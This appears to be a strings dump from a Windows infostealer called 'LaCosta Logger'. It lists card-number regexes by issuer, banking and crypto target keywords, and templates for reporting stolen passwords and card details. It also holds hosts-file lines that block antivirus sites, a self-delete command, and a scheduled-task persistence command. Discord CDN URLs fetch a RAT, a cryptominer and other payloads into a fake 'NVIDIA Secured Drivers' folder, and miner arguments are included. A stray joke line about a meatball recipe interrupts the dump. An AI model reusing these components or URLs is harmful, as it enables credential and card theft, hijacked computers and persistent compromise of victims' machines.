LaCosta Logger :

00037854    Discover Card
00037870    6(?:011|5[0-9]{2})[0-9]{12}$
000378AA    Insta Payment Card
000378D0    ^63[7-9][0-9]{13}$
000378F6    JCB Card
00037908    ^(?:2131|1800|35\d{3})\d{11}$
00037948    KoreanLocalCard
00037968    ^9[0-9]{15}$
00037982    Laser Card
00037998    ^(6304|6706|6709|6771)[0-9]{12,15}$
000379E0    Maestro Card
000379FA    ^(5018|5020|5038|6304|6759|6761|6763)[0-9]{8,15}$
00037A5E    Mastercard
00037A74    5[1-5][0-9]{14}$
00037A96    Solo Card
00037AAB    ^(6334|6767)[0-9]{12}|(6334|6767)[0-9]{14}|(6334|6767)[0-9]{15}$
00037B2D    Switch Card
00037B46    ^(4903|4905|4911|4936|6333|6759)[0-9]{12}|(4903|4905|4911|4936|6333|6759)[0-9]{14}|(4903|4905|4911|4936|6333|6759)[0-9]{15}|564182[0-9]{10}|564182[0-9]{12}|564182[0-9]{13}|633110[0-9]{10}|633110[0-9]{12}|633110[0-9]{13}$
00037D00    Union Pay Card
00037D1E    ^(62[0-9]{14,17})$
00037D44    Visa Card
00037D58    4[0-9]{12}(?:[0-9]{3})?$
00037D8A    Visa Master Card
00037DAC    ^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$
00037E08    Express Card
00037E22    3[47][0-9]{13}$
00037E42    BCDFGHJKMPQRTVWXY2346789
00037548    monero
00037556    dashcoin
00037568    litecoin
0003757A    etherium
0003758C    stellarcoin
000375DC    blockchain
000375F2    paxful
00037600    investopedia
0003761A    buybitcoinworldwide
00037642    cryptocurrency
00037660    crypto
0003766E    trade
0003767A    trading
0003769A    wallet
000376A8    porn
000376BA    hentai
000376D4    qiwi
000376DE    money
000376EA    exchange
000376FC    bank
00037706    credit
00037714    card
00037736    Amex Card
0003774A    ^3[47][0-9]{13}$
0003776C    BCGlobal
0003777E    ^(6541|6556)[0-9]{12}$
000377AC    Carte Blanche Card
000377D2    ^389[0-9]{11}$
000377F0    Diners Club Card
00037812    ^3(?:0[0-5]|[68][0-9])[0-9]{11}$
00037252    Url: {0}
00037264    Username: {1}
00037280    Password: {2}
000372A0    Type: {0}
000372B4    Number: {1}
000372CC    Exp: {2}
000372DE    Holder: {3}
Hm, it looks like that file might've been a virus. Instead of cooking up trouble, try cooking up a Spicy Italian Meatball: https://www.foodnetwork.com/recipes/ree-drummond/spicy-italian-meatballs.html 
000387E7    # Wifi Network
0003880D    # End of Wifi Network
0003885D    PASSWORD:
0003887B    # Wifi Password
000388A3    # End of Wifi Password
00038CED    127.0.0.1 www.youtube.com
00038D21    127.0.0.1 www.google.com
00038D53    127.0.0.1 www.facebook.com
00038D89    127.0.0.1 www.malwarebytes.com
00038DC7    127.0.0.1 www.instagram.com
00038DFF    127.0.0.1 www.reddit.com
00038E31    127.0.0.1 www.avast.com
00038E61    127.0.0.1 www.tiktok.com
00038E93    /C choice /C Y /N /D Y /T 3 & Del "
00038EDF    \NVIDIA Secured Drivers
00038F0F    \NVIDIA Secured Drivers\DiscordRAT.exe
00038F5E    https://cdn.discordapp.com/attachments/831225076187660348/902512908485935114/shost.exe
0003900C    \shost.exe
00039023    --url={0} --user={1} --pass={4} --threads 5 --donate-level=1 --keepalive --retries=5 --max-cpu-usage={3}
000391B0    https://cdn.discordapp.com/attachments/831225076187660348/951466723406667806/DiscordTools.exe
0003926C    \NVIDIA Secured Drivers\DiscordTools.exe
000392BF    https://cdn.discordapp.com/attachments/831225076187660348/956346715835871262/fakeDesudo.exe
00039377    \NVIDIA Secured Drivers\fakeDesudo.exe
000393C6    https://cdn.discordapp.com/attachments/831225076187660348/950526489328242718/FakeConsole.exe
00039480    \NVIDIA Secured Drivers\FakeConsole.exe
000394D1    https://cdn.discordapp.com/attachments/831225076187660348/950526991625506876/nitrogen.exe
00039585    \NVIDIA Secured Drivers\nitrogen.exe
0003982A    \Microsoft\Windows\Start Menu\Programs\Discord Inc\Discord.lnk
000398AC    .dAIO
000398B8    http://checkip.dyndns.org/
000398F6    # Main informations
00039924    Desktop name:
00039942    IP Address:
0003995E    # End of Main informations
00039998    diff
000399A8    New report
000399C4    -  Username:
000399E2    -  PC Name:
000399FE    -  IP Address:
00039AFE	emExe3.exe	
00039B14	\emExe3.exe	
00039B2C	emExe4.exe	
00039B42	\emExe4.exe	
00039B5A	emExe5.exe	
00039B70	\emExe5.exe	
00039B88	Users\	
00039B96	\AppData\Local\NVIDIA Local Drivers	
00039BDE	%poolhere%	
00039BF4	%usernamehere%	
00039C12	%usagehere%	
00039C2A	%passwordhere%	
00039C50	/C schtasks /create /tn \	
00039C8C	/st 00:00 /du 9999:59 /sc once /ri 1 /f	
